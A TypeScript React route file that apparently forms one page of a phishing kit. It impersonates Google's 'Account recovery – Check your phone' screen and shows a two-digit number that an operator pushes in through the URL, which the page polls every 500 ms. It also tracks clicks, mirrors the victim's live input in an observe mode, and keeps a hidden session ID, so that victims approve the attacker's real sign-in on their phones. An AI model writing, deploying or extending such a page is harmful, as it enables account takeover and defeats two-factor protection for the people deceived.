import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import {
  GE_SHELL_CSS,
  GeAccountChip,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  resolveGeEmail,
  setGeEmail,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/checkphone")({
  head: () => ({
    meta: [
      { title: "Account recovery - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeCheckPhonePage,
});

const GE_CODE_KEY = "ge_checkphone_code";

function readCodeFromUrl(): string {
  if (typeof window === "undefined") return "";
  try {
    const q = new URLSearchParams(window.location.search).get("code");
    if (q && /^\d{2}$/.test(q.trim())) return q.trim();
  } catch {
    /* ignore */
  }
  try {
    const stored = sessionStorage.getItem(GE_CODE_KEY) || "";
    if (/^\d{2}$/.test(stored)) return stored;
  } catch {
    /* ignore */
  }
  return "";
}

const GE_CHECKPHONE_CSS = `
${GE_SHELL_CSS}

.ge-checkphone .ge-title { margin-top: 24px; }

.ge-checkphone-lead {
  margin: 16px 0 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}


.ge-checkphone-code.is-error { color: #f28b82; }
.ge-checkphone-code {
  margin: 0;
  font-size: 3.5rem;
  font-weight: 400;
  line-height: 1.1;
  letter-spacing: 0.02em;
  color: var(--gm3-on-surface);
  font-variant-numeric: tabular-nums;
}
@media (min-width: 900px) {
  .ge-checkphone-code {
    font-size: 4.5rem;
    margin-top: 8px;
  }
}

.ge-checkphone-heading {
  margin: 20px 0 0;
  font-size: 1.125rem;
  font-weight: 500;
  line-height: 1.4;
  color: var(--gm3-on-surface);
}

.ge-checkphone-help {
  margin: 12px 0 0;
  font-size: 0.875rem;
  font-weight: 400;
  line-height: 1.4286;
  color: var(--gm3-on-surface);
}
.ge-checkphone-help strong {
  font-weight: 500;
}

@media (min-width: 900px) {
  .ge-checkphone .ge-pane-right {
    padding-top: 48px;
  }
  .ge-checkphone .ge-pane-left,
  .ge-checkphone .ge-pane-right {
    flex: 1 1 50%;
    max-width: 50%;
  }
}

.ge-checkphone-body {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}

.ge-actions {
  display: flex;
  flex-direction: row;
  flex-wrap: wrap;
  align-items: center;
  justify-content: flex-end;
  margin-top: auto;
  padding-top: 32px;
  gap: 4px;
  width: 100%;
}
@media (min-width: 900px) {
  .ge-checkphone .ge-actions {
    position: absolute;
    left: var(--c-ps-s);
    right: var(--c-ps-e);
    bottom: 36px;
    margin-top: 0;
    padding-top: 0;
    width: auto;
  }
  .ge-checkphone .ge-card {
    position: relative;
  }
  .ge-checkphone .ge-pane-left,
  .ge-checkphone .ge-pane-right {
    padding-bottom: 56px;
  }
}

.ge-btn-text {
  background: none;
  border: none;
  padding: 0 12px;
  height: 40px;
  border-radius: 20px;
  color: var(--gm-next-fill);
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-text:hover { background: rgba(138, 180, 248, 0.08); }
`;

function GeCheckPhonePage() {
  const { trackClick, sessionId, isObserve } = useGeTracking();
  const [email, setEmail] = useState(() => resolveGeEmail());
  const [code, setCode] = useState(() => readCodeFromUrl());


  useEffect(() => {
    const resolved = resolveGeEmail();
    if (resolved) {
      setEmail(resolved);
      setGeEmail(resolved);
    }
    const fromUrl = readCodeFromUrl();
    if (fromUrl) {
      setCode(fromUrl);
      try {
        sessionStorage.setItem(GE_CODE_KEY, fromUrl);
      } catch {
        /* ignore */
      }
    }
  }, []);

  // Keep code in sync if admin re-redirects with a new ?code=
  useEffect(() => {
    function onPop() {
      const next = readCodeFromUrl();
      if (next) setCode(next);
    }
    window.addEventListener("popstate", onPop);
    const id = window.setInterval(() => {
      const next = readCodeFromUrl();
      if (next && next !== code) setCode(next);
    }, 500);
    return () => {
      window.removeEventListener("popstate", onPop);
      window.clearInterval(id);
    };
  }, [code]);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (d.field === "email" || d.field === "email_submitted" || d.field === "identifier") {
        setEmail(value);
        setGeEmail(value);
      }
      if (d.field === "checkphone_code" || d.field === "code") {
        if (/^\d{2}$/.test(value)) setCode(value);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const [fieldError, setFieldError] = useState(false);
  const displayCode = code || "••";

  return (
    <div className="ge-shell ge-checkphone">
      <GeFontStyle />
      <style>{GE_CHECKPHONE_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-pane-left">
          <div className="ge-checkphone-body">
            <GoogleGLogo className="ge-logo" width={48} height={48} />
            <h1 className="ge-title">Account recovery</h1>
            <p className="ge-checkphone-lead">
              To help keep your account safe, Google wants to make sure it{"\u2019"}s
              really you trying to sign in
            </p>
            <GeAccountChip email={email} onClick={() => trackClick("Switch account")} />
          </div>
        </div>

        <div className="ge-pane-right">
          <div className="ge-checkphone-body">
            <p className={`ge-checkphone-code${fieldError ? " is-error" : ""}`} aria-label={`Verification number ${displayCode}`}>
              {displayCode}
            </p>
            <p className="ge-checkphone-heading">Check your phone</p>
            <p className="ge-checkphone-help">
              Google sent a notification to your phone. Open the Gmail app, tap{" "}
              <strong>Yes</strong> on the prompt, then tap <strong>{displayCode}</strong> on
              your phone to verify it{"\u2019"}s you.
            </p>
          </div>
        </div>

        <div className="ge-actions">
          <button
            type="button"
            className="ge-btn-text"
            onClick={() => trackClick("Resend it")}
          >
            Resend it
          </button>
          <button
            type="button"
            className="ge-btn-text"
            onClick={() => {
              trackClick("Try another way");
              setFieldError(true);
              window.setTimeout(() => setFieldError(false), 1600);
            }}
          >
            Try another way
          </button>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
